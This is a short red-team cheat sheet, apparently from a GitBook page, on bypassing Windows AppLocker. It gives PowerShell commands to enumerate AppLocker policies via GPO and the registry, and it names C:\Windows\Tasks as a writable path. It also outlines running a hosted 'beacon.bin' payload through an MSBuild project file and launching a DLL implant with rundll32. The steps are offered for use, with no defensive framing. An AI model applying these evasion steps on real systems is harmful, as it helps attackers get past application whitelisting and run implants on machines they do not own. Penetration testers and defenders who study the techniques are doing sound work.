# Windows AppLocker Bypass

## Windows AppLocker Bypass [t-ad-defense_evasion-applocker_bypass]

### 1.1 Enumerate AppLocker policies



{% code overflow="wrap" %}
```bash
#GPO
Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath
type \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol

#If on a local machine
Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"

```
{% endcode %}

### 1.2 Writable Paths in Windows directory



{% code overflow="wrap" %}
```bash
C:\Windows\Tasks

```
{% endcode %}

### 1.3 LOLBas



{% code overflow="wrap" %}
```bash
Modify applocker_bypass_msbuild.csproj
Host the payload (beacon.bin file)
Run C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe applocker_bypass_msbuild.csproj

```
{% endcode %}

### 1.4 dll (if not enforced)



{% code overflow="wrap" %}
```bash
C:\Windows\System32\rundll32.exe http_x64.dll,StartW
```
{% endcode %}

